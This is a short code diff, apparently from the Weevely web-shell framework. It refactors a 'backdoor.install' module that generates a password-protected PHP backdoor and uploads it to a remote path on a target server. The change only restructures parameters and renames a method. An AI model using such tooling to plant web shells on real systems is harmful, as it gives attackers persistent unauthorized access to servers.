@@ -14,10 +14,14 @@ class Install(Module):
     :backdoor.install <password> <remote path>
     """
     
-    def run(self, password, remote_path):
+    params = ParametersList('Upload further Weevely backdoor', None,
+            P(arg='pwd', help='Password to generate PHP backdoor', required=True, pos=0),
+            P(arg='rpath', help='Remote path where upload file', required=True, pos=1))
+    
+    def run_module(self, password, remote_path):
 
         backdoor = Backdoor(password)
-        self.modhandler.load('file.upload').run('', remote_path, file_content = str(backdoor))
+        self.modhandler.load('file.upload').run_module('', remote_path, file_content = str(backdoor))
         
            
     
